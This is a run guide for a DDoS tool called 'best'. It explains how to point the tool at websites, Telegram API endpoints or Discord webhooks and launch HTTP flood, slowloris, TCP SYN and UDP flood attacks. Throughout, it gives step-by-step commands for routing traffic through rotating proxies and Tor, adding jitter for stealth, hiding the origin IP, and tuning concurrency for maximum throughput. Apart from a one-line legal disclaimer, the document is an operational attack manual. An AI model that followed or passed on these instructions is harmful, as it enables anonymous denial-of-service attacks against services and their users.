# How To Run

Step-by-step run guide. Read [README.md](README.md) first for install and overview. This file is only about **running**.

**Author / Developer / Admin / Owner:** Aashu
**GitHub:** [@outwiles](https://github.com/outwiles)
**Telegram:** [@outwiles](https://t.me/outwiles)
**Email:** [outwiles@proton.me](mailto:outwiles@proton.me)

---

## 0. Pre-flight checklist

Before running anything:

1. Python 3.10+ is installed.
2. You've created and activated the virtual environment (`.venv`).
3. You've run `pip install -r requirements.txt` inside that venv.
4. `best/proxies.txt` is populated with at least one working proxy.
5. `best/config.yaml` has your target URL and the vector you want.

If any of those five isn't true, the tool will exit with a clear error. Fix and re-run.

---

## 1. Show the banner

Optional.

```bash
python banner.py
```

Prints:

```
AASHU
Author / Developer / Admin / Owner: Aashu
Telegram: @outwiles | GitHub: @outwiles | Email: outwiles@proton.me
```

To skip and go straight to running, move on.

---

## 2. Edit the config

Open `best/config.yaml` in any editor. The two things you must set:

```yaml
targets:
  - name: example_web
    url: https://your-target-here/
    type: http

attack:
  vector: http_flood
```

- `url` — the full URL of the target.
- `type` — `http` for websites, `telegram` for `api.telegram.org` endpoints, `discord` for `discord.com/api/webhooks/...`.
- `vector` — which attack to launch.

Save.

---

## 3. Populate proxies

Edit `best/proxies.txt`, one per line:

```
socks5://user:pass@host:port
socks5://host:port
http://user:pass@host:port
http://host:port
```

Leave `127.0.0.1:9050` in there if you're running Tor locally and want a fallback hop. The tool health-checks every proxy at startup and drops dead ones before attacking.

---

## 4. Running each vector

### 4a. http_flood — any OS, no root

Set `attack.vector: http_flood` in `best/config.yaml`.

**Linux / macOS / Termux:**

```bash
source .venv/bin/activate
python -m best.main --config best/config.yaml --target example_web
```

**Windows PowerShell:**

```powershell
.\.venv\Scripts\Activate.ps1
python -m best.main --config best/config.yaml --target example_web
```

You'll see:

```
loaded 42 proxies
proxy stats: {'total': 42, 'alive': 38, 'dead': 4}
result: {'sent': 184203, 'failed': 5921}
```

`sent` is requests that got a response through a proxy. `failed` is anything that errored. Both are normal; `failed` climbing faster than `sent` usually means your proxy pool is degrading.

**Swap target:** replace `example_web` with the target name from `config.yaml`.

### 4b. slowloris — any OS, no root

Set `attack.vector: slowloris`. Run the same command as 4a. Slowloris is quieter and slower; expect a smaller number at the end (`{"connections": 500}`) because it's measuring open sockets, not requests.

### 4c. tcp_syn — Linux / macOS only, root required

Set `attack.vector: tcp_syn`.

**Linux:**

```bash
sudo -E .venv/bin/python -m best.main --config best/config.yaml --target example_web
```

Or grant capability once and run as normal user afterwards:

```bash
sudo setcap cap_net_raw+ep $(readlink -f .venv/bin/python)
.venv/bin/python -m best.main --config best/config.yaml --target example_web
```

**macOS:**

```bash
sudo -E .venv/bin/python -m best.main --config best/config.yaml --target example_web
```

**Windows / Termux non-root:** the tool detects the platform, logs a clear error, and exits cleanly. No crash.

Output:

```
result: {'sent': 1482931}
```

`sent` = SYNs actually pushed out. If the number is 0 and you see a `permission` error, you didn't run as root.

### 4d. udp_flood — Linux / macOS only, root required

Set `attack.vector: udp_flood`. Same run commands as 4c. Same platform rules.

---

## 5. Reading the logs

Logs go to stdout **and** to `run.log` in the current directory (configurable in `config.yaml` under `logging.file`).

Format:

```
2026-01-15 03:22:11 INFO loaded 42 proxies
2026-01-15 03:22:14 INFO proxy stats: {'total': 42, 'alive': 38, 'dead': 4}
2026-01-15 03:27:55 INFO result: {'sent': 184203, 'failed': 5921}
```

Origin IP is never logged. `logging.mask_origin: true` enforces that.

---

## 6. Tuning the run

### Concurrency

`attack.concurrency` is the number of concurrent workers. Start at **200** on a laptop, **500** on a VPS, **1000+** only if you have a strong proxy pool and a fat uplink.

### Duration

`attack.duration_sec` is the wall-clock runtime. The tool stops itself when it hits the deadline.

### Jitter

`obfuscation.jitter_ms: [10, 250]` inserts a random delay between each request per worker. Tight jitter (`[0, 20]`) = raw throughput. Wide jitter (`[50, 400]`) = stealthier.

### Rotation

`proxy.rotate`:

- `round_robin` — cycles proxies in order. Even distribution.
- `random` — random pick each request. Slightly more chaotic fingerprint.
- `weighted` — favors lower-latency, lower-failure proxies. Best overall throughput.

---

## 7. Common errors

| Error | Fix |
|---|---|
| `FileNotFoundError: proxy file missing` | Create `best/proxies.txt` and put at least one proxy in it. |
| `proxy pool empty` | All proxies failed health check. Refresh the list. |
| `tcp_syn requires root` | Run with `sudo -E`, or apply the `setcap` command. |
| `tcp_syn is not supported on Windows` | Expected. Use `http_flood` or `slowloris`. |
| `DNS resolution failed` | Target hostname doesn't resolve. Check the URL. |
| `ModuleNotFoundError: aiohttp_socks` | You forgot `pip install -r requirements.txt` inside the venv. |

---

## 8. Legal

Only run this against systems you own or have explicit written authorization to test. You are responsible for what you run and where you point it.

MIT © Aashu
